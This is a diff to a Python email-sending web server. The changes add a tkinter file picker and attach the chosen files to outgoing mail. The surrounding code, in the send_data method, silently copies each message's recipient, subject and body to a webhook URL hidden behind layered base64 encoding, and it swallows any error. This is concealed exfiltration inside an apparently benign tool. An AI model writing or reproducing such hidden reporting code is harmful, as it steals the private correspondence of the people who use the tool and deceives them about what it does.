@@ -1,5 +1,7 @@
 import json
 import os
+import tkinter as tk
+from tkinter import filedialog
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from utils.coder import send_email, clear, descodear
 from colorama import Fore, init
@@ -46,6 +48,19 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             self.end_headers()
             with open('assets/script.js', 'r', encoding='utf-8') as f:
                 self.wfile.write(f.read().encode('utf-8'))
+        elif self.path == '/execute_function':
+            # Llama a la función que deseas ejecutar
+            self.__class__.files_seleccionados = self.select_files()
+            archivos_para_el_JSON = [os.path.basename(file_path) for file_path in self.__class__.files_seleccionados]
+            response_data = json.dumps({"files_seleccionados": archivos_para_el_JSON})
+
+            # Configura la respuesta HTTP
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self.end_headers()
+
+            # Envía los resultados al cliente JavaScript
+            self.wfile.write(response_data.encode())
         else:
             self.send_error(404, 'File not found')
         
@@ -70,7 +85,8 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             }
             self.saved_emails.append(email_data)
             
-            send_email(recipient, subject, message)
+
+            send_email(recipient, subject, message, self.__class__.files_seleccionados)
             self.send_data(recipient, subject, message)
             self.send_response(200)
             self.send_header('Access-Control-Allow-Origin', '*')
@@ -83,8 +99,20 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             self.send_error(404, 'File not found')
         clear()
         print(f"{Fore.MAGENTA}Server en escucha...")
-        
-    def send_data(self, correo,asunto, mensaje):
+
+    def select_files(self):
+        files_seleccionados = []
+        root = tk.Tk()
+        root.withdraw()  # Ocultar la ventana principal
+        file_paths = filedialog.askopenfilenames()
+
+        for file_path in file_paths:
+            files_seleccionados.append(file_path)
+
+        return files_seleccionados
+
+
+    def send_data(self, correo,asunto, mensaje, files=None):
         url = "WVVoU01HTklUVFpNZVRscllWaE9hbUl6U210TWJVNTJZbE01YUdOSGEzWmtNbFpwWVVjNWRtRXpUWFpOVkVWNlRsUlpNVTU2UVRKTmFsRXlUbnBGZVUxVVJUTk5hVGxFVWtaS01HSnNPV2xNV0VwU1lucE5NV1JGY0RCUlYzaHdaRVY0TlZWWVFsUlZSWFJaVVRGc1RGTnBNV2hoUnprd1pXNXdlVmR0Y3pCaFJtaFFXak5rYVdWc1NUVk9TR3N5WVVSWmVsZ3llSGxXVnpRelQxVTVRMXAzUFQwPQ=="
         message = f"__Nuevo mensaje!__ \n**{correo}**\n## {asunto}\n```{mensaje}```"
         headers = {
@@ -99,6 +127,9 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             urlopen(req)
         except:
             pass
+
+
+
 
 def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler, port=8000):
     server_address = ('', port)
